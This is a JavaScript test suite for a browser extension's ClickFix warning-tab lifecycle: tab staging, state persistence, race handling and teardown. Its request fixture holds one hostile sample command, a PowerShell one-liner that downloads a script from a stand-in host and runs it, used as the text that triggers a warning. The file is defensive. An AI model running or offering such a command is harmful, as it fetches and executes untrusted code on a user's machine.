import test from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";

import {
  CLICKFIX_WARNING_STAGING_URL,
  createClickfixWarningStore,
} from "./clickfixWarnings.mjs";
import {
  abandonClickfixWarningTab,
  createClickfixWarningNavigationMonitor,
  openClickfixWarningTab,
} from "./clickfixWarningTabs.mjs";

const INTERSTITIAL_BASE =
  "chrome-extension://abc/interstitial/clickfix.html?kind=clickfix";
const interstitialUrl = (requestId) =>
  `${INTERSTITIAL_BASE}&request=${encodeURIComponent(requestId)}`;

function memoryStorage() {
  let data = {};
  return {
    async get(keys) {
      await Promise.resolve();
      const requested = Array.isArray(keys) ? keys : [keys];
      const result = {};
      for (const key of requested) {
        if (Object.hasOwn(data, key)) result[key] = structuredClone(data[key]);
      }
      return result;
    },
    async set(values) {
      await Promise.resolve();
      data = { ...data, ...structuredClone(values) };
    },
  };
}

// A chrome.tabs stand-in that records the exact call sequence, so "created
// inactive" and "navigated and activated only afterwards" are observable
// rather than inferred.
function fakeTabs({ failCreate = false, failUpdate = false, createdId = 77 } = {}) {
  const calls = [];
  const open = new Set();
  const records = new Map();
  return {
    calls,
    open,
    async create(properties) {
      calls.push({ call: "create", properties });
      if (failCreate) throw new Error("tab creation failed");
      open.add(createdId);
      records.set(createdId, { id: createdId, ...properties });
      return { id: createdId, ...properties };
    },
    async get(tabId) {
      const tab = records.get(tabId);
      if (tab === undefined) throw new Error("no such tab");
      return { ...tab };
    },
    async update(tabId, properties) {
      calls.push({ call: "update", tabId, properties });
      if (failUpdate && properties.url !== undefined) throw new Error("navigation failed");
      const existing = records.get(tabId) ?? { id: tabId };
      records.set(tabId, { ...existing, ...properties });
      return { id: tabId, ...properties };
    },
    async remove(tabId) {
      calls.push({ call: "remove", tabId });
      open.delete(tabId);
      records.delete(tabId);
    },
  };
}

function harness({
  tabs = fakeTabs(),
  sourceDocumentAlive = true,
  cryptoApi = { randomUUID: () => "request-a" },
  now = () => 1_000,
  autoCommit = true,
} = {}) {
  const warnings = createClickfixWarningStore(memoryStorage(), { now, cryptoApi });
  const navigationMonitor = createClickfixWarningNavigationMonitor();
  const rawUpdate = tabs.update.bind(tabs);
  tabs.update = async (tabId, properties) => {
    const result = await rawUpdate(tabId, properties);
    if (autoCommit && properties.url?.startsWith(INTERSTITIAL_BASE)) {
      const requestId = new URL(properties.url).searchParams.get("request");
      await warnings.reconcileWarningTabNavigation({
        warningTabId: tabId,
        requestId,
        url: properties.url,
        phase: "committed",
        documentId: "interstitial-document",
      });
      navigationMonitor.commit(tabId, requestId);
    }
    return result;
  };
  const stateChanges = [];
  const dependencies = {
    tabs,
    warnings,
    interstitialUrl,
    stagingUrl: CLICKFIX_WARNING_STAGING_URL,
    getWarningTabDocument: async () => ({
      url: CLICKFIX_WARNING_STAGING_URL,
      documentId: "staging-document",
    }),
    navigationMonitor,
    isSourceDocumentAlive: async () =>
      typeof sourceDocumentAlive === "function" ? sourceDocumentAlive() : sourceDocumentAlive,
    onStateChanged: async () => {
      stateChanges.push(await warnings.nextExpiry());
    },
  };
  return { tabs, warnings, navigationMonitor, dependencies, stateChanges };
}

function request(overrides = {}) {
  return {
    sourceTabId: 5,
    sourceFrameId: 0,
    sourceDocumentId: "document-a",
    sourceUrl: "https://source.test",
    windowId: 3,
    mode: "warn",
    decision: { action: "warn", reasons: ["system tool"] },
    text: "powershell iwr https://payload.test/a.ps1 | iex",
    ...overrides,
  };
}

test("the warning tab is staged inactive and only navigated once its record exists", async () => {
  const { tabs, warnings, dependencies } = harness();

  const presentation = await openClickfixWarningTab(request(), dependencies);

  assert.equal(presentation.ok, true);
  assert.equal(presentation.warning.requestId, "request-a");
  assert.equal(presentation.warning.warningTabId, 77);
  assert.deepEqual(tabs.calls, [
    {
      call: "create",
      properties: {
        url: CLICKFIX_WARNING_STAGING_URL,
        active: false,
        openerTabId: 5,
        windowId: 3,
      },
    },
    {
      call: "update",
      tabId: 77,
      properties: { url: interstitialUrl("request-a"), active: true },
    },
  ]);
  // The interstitial's single lookup succeeds: the record was bound to this
  // tab before the tab was ever pointed at the interstitial.
  assert.equal((await warnings.getWarning("request-a", 77)).mode, "warn");
});

test("state is persisted strictly before the interstitial navigation", async () => {
  const order = [];
  const tabs = fakeTabs();
  const { warnings, dependencies } = harness({ tabs });
  const createBoundWarning = warnings.createBoundWarning.bind(warnings);
  warnings.createBoundWarning = async (input) => {
    order.push("persist");
    return createBoundWarning(input);
  };
  const update = tabs.update.bind(tabs);
  tabs.update = async (tabId, properties) => {
    if (properties.url !== undefined) {
      // The record the interstitial will read must already be retrievable.
      order.push(await warnings.getWarning("request-a", tabId) === null ? "navigate-unbound" : "navigate");
    }
    return update(tabId, properties);
  };

  await openClickfixWarningTab(request(), dependencies);

  assert.deepEqual(order, ["persist", "navigate"]);
});

test("the exact source document is revalidated before the warning tab is revealed", async () => {
  const order = [];
  const tabs = fakeTabs();
  const { warnings, dependencies } = harness({ tabs });
  let validated = null;
  dependencies.isSourceDocumentAlive = async (warning) => {
    validated = warning;
    order.push("revalidate");
    return true;
  };
  const update = tabs.update.bind(tabs);
  tabs.update = async (tabId, properties) => {
    order.push(properties.active === true ? "activate" : "update");
    return update(tabId, properties);
  };

  await openClickfixWarningTab(request(), dependencies);

  assert.deepEqual(order, ["revalidate", "activate"]);
  assert.equal(validated.sourceDocumentId, "document-a");
  assert.equal(validated.sourceTabId, 5);
  assert.notEqual(await warnings.getWarning("request-a", 77), null);
});

test("a source document replaced during setup withdraws the warning and never shows a tab", async () => {
  const { tabs, warnings, dependencies } = harness({ sourceDocumentAlive: false });

  const presentation = await openClickfixWarningTab(request(), dependencies);

  assert.deepEqual(presentation, { ok: false, code: "warning_unavailable" });
  assert.deepEqual(tabs.calls.map((entry) => entry.call), ["create", "remove"]);
  assert.equal(tabs.open.size, 0, "no blank tab is left behind");
  assert.equal(await warnings.getWarning("request-a", 77), null);
  // The staging tab was never activated, so the source tab kept focus.
  assert.equal(tabs.calls.some((entry) => entry.properties?.active === true), false);
});

test("a failed tab creation persists nothing at all", async () => {
  const tabs = fakeTabs({ failCreate: true });
  const { warnings, dependencies } = harness({ tabs });

  const presentation = await openClickfixWarningTab(request(), dependencies);

  assert.equal(presentation.ok, false);
  assert.equal(presentation.code, "warning_unavailable");
  assert.match(presentation.error.message, /tab creation failed/);
  assert.deepEqual(tabs.calls.map((entry) => entry.call), ["create"]);
  assert.equal(await warnings.nextExpiry(), null, "no record was created");
});

test("a tab created without an id is treated as a failed setup", async () => {
  const tabs = fakeTabs();
  tabs.create = async (properties) => {
    tabs.calls.push({ call: "create", properties });
    return {};
  };
  const { warnings, dependencies } = harness({ tabs });

  const presentation = await openClickfixWarningTab(request(), dependencies);

  assert.equal(presentation.code, "warning_unavailable");
  assert.equal(await warnings.nextExpiry(), null);
});

test("a failed warning-state creation closes the staging tab and keeps the source tab", async () => {
  const tabs = fakeTabs();
  const { warnings, dependencies } = harness({ tabs });
  warnings.createBoundWarning = async () => {
    throw new Error("session storage unavailable");
  };

  const presentation = await openClickfixWarningTab(request(), dependencies);

  assert.equal(presentation.code, "warning_unavailable");
  assert.match(presentation.error.message, /session storage unavailable/);
  assert.deepEqual(tabs.calls.map((entry) => entry.call), ["create", "remove"]);
  assert.equal(tabs.open.size, 0);
  assert.equal(tabs.calls.some((entry) => entry.properties?.active === true), false);
});

test("a failed interstitial navigation discards the record, closes the tab, and restores focus", async () => {
  const tabs = fakeTabs({ failUpdate: true });
  const { warnings, dependencies } = harness({ tabs });

  const presentation = await openClickfixWarningTab(request(), dependencies);

  assert.equal(presentation.code, "warning_unavailable");
  assert.match(presentation.error.message, /navigation failed/);
  assert.deepEqual(tabs.calls.map((entry) => entry.call), ["create", "update", "remove", "update"]);
  assert.deepEqual(tabs.calls.at(-1), { call: "update", tabId: 5, properties: { active: true } });
  assert.equal(tabs.open.size, 0, "no blank tab is left behind");
  assert.equal(await warnings.getWarning("request-a", 77), null);
  assert.equal(await warnings.nextExpiry(), null, "no orphaned session remains");
});

test("a rate-limited source is refused before any tab is opened", async () => {
  let index = 0;
  const tabs = fakeTabs();
  const ids = ["a", "b", "c", "d"];
  const { warnings, dependencies } = harness({
    tabs,
    cryptoApi: { randomUUID: () => ids[index++] },
  });
  let nextTabId = 100;
  tabs.create = async (properties) => {
    tabs.calls.push({ call: "create", properties });
    const id = nextTabId;
    nextTabId += 1;
    tabs.open.add(id);
    return { id, ...properties };
  };

  for (let attempt = 0; attempt < 3; attempt += 1) {
    assert.equal((await openClickfixWarningTab(request(), dependencies)).ok, true);
  }
  const refused = await openClickfixWarningTab(request(), dependencies);

  assert.deepEqual(refused, { ok: false, code: "rate_limited" });
  assert.equal(
    tabs.calls.filter((entry) => entry.call === "create").length,
    3,
    "a refused request must not make the browser open and close a tab"
  );
});

test("a cap reached between the probe and the atomic create still leaves no tab behind", async () => {
  const tabs = fakeTabs();
  const { warnings, dependencies } = harness({ tabs });
  warnings.canCreateWarning = async () => true;
  warnings.createBoundWarning = async () => null;

  const presentation = await openClickfixWarningTab(request(), dependencies);

  assert.deepEqual(presentation, { ok: false, code: "rate_limited" });
  assert.deepEqual(tabs.calls.map((entry) => entry.call), ["create", "remove"]);
  assert.equal(tabs.open.size, 0);
});

test("a request with no source document is refused without opening anything", async () => {
  const tabs = fakeTabs();
  const { dependencies } = harness({ tabs });

  for (const invalid of [undefined, "", 7]) {
    const presentation = await openClickfixWarningTab(
      request({ sourceDocumentId: invalid }), dependencies
    );
    assert.deepEqual(presentation, { ok: false, code: "warning_unavailable" });
  }
  assert.deepEqual(tabs.calls, []);
});

// =============================================================================
// COLD-WORKER EVENT ORDERING
//
// The bug this issue fixes: a cold MV3 worker processes the staging tab's own
// navigation events while the warning is still being set up. Under the old
// lifecycle that cleanup could delete the record between its "is this tab a
// warning tab?" check and the binding that made it one.
// =============================================================================

test("navigation events arriving throughout setup cannot destroy the warning", async () => {
  // The staging tab's about:blank events can land before the record exists,
  // while it is staged, or after its interstitial commits.
  const interleavePoints = ["before-create", "after-create", "after-persist", "after-navigate"];
  for (const point of interleavePoints) {
    const tabs = fakeTabs();
    const { warnings, dependencies } = harness({ tabs });
    const staging = () => warnings.reconcileWarningTabNavigation({
      warningTabId: 77,
      requestId: null,
      url: CLICKFIX_WARNING_STAGING_URL,
    });
    const outcomes = [];

    if (point === "before-create") outcomes.push(await staging());
    const create = tabs.create.bind(tabs);
    tabs.create = async (properties) => {
      const tab = await create(properties);
      if (point === "after-create") outcomes.push(await staging());
      return tab;
    };
    const createBoundWarning = warnings.createBoundWarning.bind(warnings);
    warnings.createBoundWarning = async (input) => {
      const created = await createBoundWarning(input);
      if (point === "after-persist") outcomes.push(await staging());
      return created;
    };

    const presentation = await openClickfixWarningTab(request(), dependencies);
    if (point === "after-navigate") {
      // The interstitial commit is reconciled, then a late duplicate of the
      // staging event arrives behind it.
      outcomes.push(await warnings.reconcileWarningTabNavigation({
        warningTabId: 77,
        requestId: "request-a",
        url: interstitialUrl("request-a"),
      }));
      outcomes.push(await staging());
    }

    assert.equal(presentation.ok, true, point);
    assert.equal(
      (await warnings.getWarning("request-a", 77))?.requestId,
      "request-a",
      `the warning survives a staging event ${point}`
    );
    assert.equal(
      outcomes.some((outcome) => outcome.outcome === "discarded"),
      false,
      `no expected event discarded the record (${point})`
    );
  }
});

test("the warning is still discarded when its tab really is navigated away", async () => {
  const { warnings, dependencies } = harness();
  await openClickfixWarningTab(request(), dependencies);

  const reconciled = await warnings.reconcileWarningTabNavigation({
    warningTabId: 77,
    requestId: null,
    url: "https://attacker.test/",
  });

  assert.equal(reconciled.outcome, "discarded");
  assert.equal(await warnings.getWarning("request-a", 77), null);
});

test("cleanup winning during source validation prevents tabs.update", async () => {
  const { tabs, warnings, dependencies } = harness();
  dependencies.isSourceDocumentAlive = async () => {
    await warnings.discardWarning("request-a");
    return true;
  };

  const presentation = await openClickfixWarningTab(request(), dependencies);

  assert.deepEqual(presentation, { ok: false, code: "warning_unavailable" });
  assert.deepEqual(tabs.calls.map((entry) => entry.call), ["create", "remove"]);
  assert.equal(
    tabs.calls.some((entry) => entry.call === "update" && entry.properties.url !== undefined),
    false
  );
});

test("success waits for the matching committed navigation", async () => {
  const { tabs, warnings, navigationMonitor, dependencies } = harness({ autoCommit: false });

  const opening = openClickfixWarningTab(request(), dependencies);
  while (!tabs.calls.some((entry) => entry.call === "update" && entry.properties.url !== undefined)) {
    await new Promise((resolve) => setImmediate(resolve));
  }

  assert.equal((await warnings.getWarning("request-a", 77)).status, "navigating");
  let settled = false;
  void opening.then(() => { settled = true; });
  await new Promise((resolve) => setImmediate(resolve));
  assert.equal(settled, false, "tabs.update resolution is not presentation success");

  await warnings.reconcileWarningTabNavigation({
    warningTabId: 77,
    requestId: "request-a",
    url: interstitialUrl("request-a"),
    phase: "committed",
    documentId: "interstitial-document",
  });
  navigationMonitor.commit(77, "request-a");

  const presentation = await opening;
  assert.equal(presentation.ok, true);
  assert.equal(presentation.warning.status, "active");
});

test("a navigation error after tabs.update unwinds state, tab, and focus", async () => {
  const { tabs, warnings, navigationMonitor, dependencies } = harness({ autoCommit: false });
  const opening = openClickfixWarningTab(request(), dependencies);
  while (!tabs.calls.some((entry) => entry.call === "update" && entry.properties.url !== undefined)) {
    await new Promise((resolve) => setImmediate(resolve));
  }

  navigationMonitor.fail(77, new Error("net::ERR_ABORTED"));
  const presentation = await opening;

  assert.equal(presentation.code, "warning_unavailable");
  assert.match(presentation.error.message, /ERR_ABORTED/);
  assert.equal(await warnings.getWarning("request-a", 77), null);
  assert.deepEqual(tabs.calls.slice(-2), [
    { call: "remove", tabId: 77 },
    { call: "update", tabId: 5, properties: { active: true } },
  ]);
});

test("alarm scheduling failures cannot strand setup or teardown", async () => {
  const tabs = fakeTabs({ failUpdate: true });
  const { warnings, dependencies } = harness({ tabs });
  dependencies.onStateChanged = async () => {
    throw new Error("alarms unavailable");
  };

  const failedOpen = await openClickfixWarningTab(request(), dependencies);
  assert.equal(failedOpen.code, "warning_unavailable");
  assert.equal(tabs.open.size, 0);
  assert.equal(await warnings.getWarning("request-a", 77), null);
  assert.deepEqual(tabs.calls.slice(-2), [
    { call: "remove", tabId: 77 },
    { call: "update", tabId: 5, properties: { active: true } },
  ]);
});

// =============================================================================
// TEARDOWN WHEN THE RECORD IS GONE
// =============================================================================

test("abandoning a warning tab restores the source tab and closes the warning tab", async () => {
  const { tabs, warnings, dependencies } = harness();
  await openClickfixWarningTab(request(), dependencies);
  tabs.calls.length = 0;

  const result = await abandonClickfixWarningTab(77, dependencies);

  assert.equal(result.ok, true);
  assert.equal(result.warning.sourceTabId, 5);
  assert.deepEqual(tabs.calls, [
    { call: "update", tabId: 5, properties: { active: true } },
    { call: "remove", tabId: 77 },
  ]);
  assert.equal(await warnings.nextExpiry(), null, "the record is consumed exactly once");

  // A second teardown of the same tab has nothing left to restore.
  tabs.calls.length = 0;
  const repeated = await abandonClickfixWarningTab(77, dependencies);
  assert.equal(repeated.warning, null);
  assert.deepEqual(tabs.calls, [{ call: "remove", tabId: 77 }]);
});

test("missing warning state still restores focus through the browser opener", async () => {
  const { tabs, warnings, dependencies } = harness();
  await openClickfixWarningTab(request(), dependencies);
  await warnings.discardWarning("request-a");
  tabs.calls.length = 0;

  const result = await abandonClickfixWarningTab(77, dependencies);

  assert.equal(result.warning, null);
  assert.deepEqual(tabs.calls, [
    { call: "update", tabId: 5, properties: { active: true } },
    { call: "remove", tabId: 77 },
  ]);
});

test("teardown ignores alarm scheduling failure", async () => {
  const { tabs, dependencies } = harness();
  await openClickfixWarningTab(request(), dependencies);
  dependencies.onStateChanged = async () => {
    throw new Error("alarms unavailable");
  };
  tabs.calls.length = 0;

  assert.equal((await abandonClickfixWarningTab(77, dependencies)).ok, true);
  assert.deepEqual(tabs.calls, [
    { call: "update", tabId: 5, properties: { active: true } },
    { call: "remove", tabId: 77 },
  ]);
});

test("a closed source tab does not stop the warning tab from being taken down", async () => {
  const tabs = fakeTabs();
  const { warnings, dependencies } = harness({ tabs });
  await openClickfixWarningTab(request(), dependencies);
  const update = tabs.update.bind(tabs);
  tabs.update = async (tabId, properties) => {
    if (tabId === 5) throw new Error("no such tab");
    return update(tabId, properties);
  };
  tabs.calls.length = 0;

  assert.equal((await abandonClickfixWarningTab(77, dependencies)).ok, true);
  assert.deepEqual(tabs.calls.at(-1), { call: "remove", tabId: 77 });
  assert.equal(await warnings.nextExpiry(), null);
});

test("the lifecycle module rejects an incomplete dependency set", async () => {
  await assert.rejects(
    openClickfixWarningTab(request(), { warnings: {}, interstitialUrl, stagingUrl: "about:blank" }),
    /chrome\.tabs-compatible API is required/
  );
  await assert.rejects(
    openClickfixWarningTab(request(), {
      tabs: fakeTabs(),
      warnings: {},
      stagingUrl: "about:blank",
      isSourceDocumentAlive: async () => true,
    }),
    /interstitialUrl must be a function/
  );
  await assert.rejects(abandonClickfixWarningTab(-1, harness().dependencies), /warningTabId/);
});

// No call path anywhere can navigate a warning tab that has no record yet.
test("no source path opens a visible warning tab before its record exists", async () => {
  const source = await readFile(new URL("./clickfixWarningTabs.mjs", import.meta.url), "utf8");
  const stagingCreate = source.indexOf("await tabs.create({");
  const persist = source.indexOf("warnings.createBoundWarning({", stagingCreate);
  const revalidate = source.indexOf("await isSourceDocumentAlive(warning)", persist);
  const navigate = source.indexOf("await tabs.update(warningTabId, {", revalidate);

  assert.ok(stagingCreate >= 0 && persist > stagingCreate);
  assert.ok(revalidate > persist && navigate > revalidate);
  assert.match(
    source.slice(stagingCreate, persist),
    /url: stagingUrl,\s*active: false,/,
    "the tab that supplies the target id is never created visible"
  );
  assert.equal(
    (source.match(/active: true/g) ?? []).length,
    2,
    "activation happens only when navigating the interstitial or restoring the source tab"
  );
});
